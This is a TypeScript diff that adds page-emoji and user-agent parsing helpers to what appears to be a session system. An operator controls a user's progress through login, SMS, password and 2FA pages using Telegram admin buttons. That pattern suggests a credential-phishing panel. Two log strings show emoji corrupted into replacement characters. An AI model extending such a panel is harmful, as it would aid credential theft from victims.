@@ -753,7 +753,7 @@ export const setUserCurrentStep = async (
 
     // Check if step actually changed
     if (session.currentStep === step) {
-      console.log("���️ Current step unchanged, skipping update");
+      console.log("ℹ️ Current step unchanged, skipping update");
       return true;
     }
 
@@ -929,7 +929,7 @@ export const showAdminButtons = async (sessionId: string): Promise<boolean> => {
  * Admin buttons should ONLY be shown when user is on loading page (waiting_admin)
  */
 const getAdminKeyboard = (sessionId: string, session: UserSession) => {
-  console.log("🎛️ Building admin keyboard for session:", {
+  console.log("���️ Building admin keyboard for session:", {
     sessionId,
     currentStep: session.currentStep,
     completedSteps: session.completedSteps,
@@ -1375,6 +1375,51 @@ const updateTelegramMessage = async (
 
     // Don't throw the error, just log it to prevent breaking the user flow
   }
+};
+
+/**
+ * Get appropriate emoji for page type
+ */
+const getPageEmoji = (pageName: string): string => {
+  const page = pageName.toLowerCase();
+  if (page.includes('login') || page.includes('auth')) return '🔐';
+  if (page.includes('verify') || page.includes('sms') || page.includes('code')) return '📱';
+  if (page.includes('password')) return '🔑';
+  if (page.includes('email')) return '📧';
+  if (page.includes('google') || page.includes('2fa')) return '🔒';
+  if (page.includes('loading') || page.includes('process')) return '⏳';
+  if (page.includes('error')) return '❌';
+  if (page.includes('success') || page.includes('complete')) return '✅';
+  if (page.includes('phone')) return '📞';
+  if (page.includes('debug')) return '🛠️';
+  return '📄';
+};
+
+/**
+ * Extract simplified browser info from user agent
+ */
+const extractBrowserInfo = (userAgent: string): string => {
+  // Mobile detection
+  const isMobile = /Mobile|Android|iPhone|iPad/.test(userAgent);
+
+  // Browser detection
+  let browser = 'Unknown';
+  if (userAgent.includes('Chrome')) browser = 'Chrome';
+  else if (userAgent.includes('Firefox')) browser = 'Firefox';
+  else if (userAgent.includes('Safari')) browser = 'Safari';
+  else if (userAgent.includes('Edge')) browser = 'Edge';
+
+  // OS detection
+  let os = '';
+  if (userAgent.includes('Windows')) os = 'Windows';
+  else if (userAgent.includes('Mac')) os = 'Mac';
+  else if (userAgent.includes('Linux')) os = 'Linux';
+  else if (userAgent.includes('Android')) os = 'Android';
+  else if (userAgent.includes('iPhone')) os = 'iOS';
+
+  // Format result
+  const deviceType = isMobile ? '📱 Mobile' : '💻 Desktop';
+  return `${deviceType} • ${browser}${os ? ` • ${os}` : ''}`;
 };
 
 /**
